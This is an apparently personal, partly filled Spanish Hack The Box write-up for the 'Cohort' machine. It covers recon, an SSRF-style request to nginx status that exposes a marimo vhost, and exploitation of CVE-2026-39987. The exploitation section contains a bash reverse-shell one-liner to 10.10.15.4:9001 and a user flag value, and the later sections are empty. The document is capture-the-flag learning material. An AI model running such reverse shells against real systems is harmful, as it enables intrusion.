---
title: Hack the box- Cohort
date: 2026-10-8
platform: Hack the box
difficulty: Easy
os: Linux
tags:
  - 
status: ""
---

# Resumen Ejecutivo
**IP Objetivo:** `10.129.244.174`
**Descripción breve:** 

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos
```bash

```

**Puertos Abiertos:**
- 22, 80, 443

### Enumeración de Servicios / Fuzzing
```bash

```

**Descubrimientos clave:**
- no encontre nada interesante, todo redirige a la pagina principal

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
- Al interceptar la peticion de portal.html, nos damos cuenta que hace una peticion a /api/validate para validar el archivo csv o el archvo que se le pase
- podemos modificar la url para acceder a nginx con esto http://0/status
- vemos que nos devuelve un vhost, lo agregamos a /etc/hosts y lo colocamos en la url, nos saldra una web de marimo

---

## 3. Exploitation (Acceso Inicial)

### Metodología
1. Nos damos cuenta que marimo tiene la version 0.20.4 que es susceptible al CVE-2026-39987 que nos da RCE sin autorizacion por `/terminal/ws`
2. Descargamos un exploit que nos de acceso a ejecutar comandos en la maquina victima
3.  obtenemos la flag

### Ejecución
```bash
python exploit2.py "https://nb-1be3782a8afd3ad5.cohort.htb" "setsid bash -c 'bash -i >& /dev/tcp/10.10.15.4/9001 0>&1' < /dev/null &"
```

**Prueba de acceso (User Flag):**
```bash
dba083621ca5cf6d7ef0158b7e8111c9
```

---

## 4. Privilege Escalation (Escalada de Privilegios)

### Enumeración Interna
- 

### Explotación Local
1. 
2. 
3. 

### Ejecución
```bash

```

**Prueba de acceso (Root/SYSTEM Flag):**
```bash

```

---

## 5. Post-Exploitation & Clean Up
- [ ] 
- [ ] 
- [ ] 

---

## Remediation (Mitigaciones)
- **Acceso inicial:** 
- **Escalada:**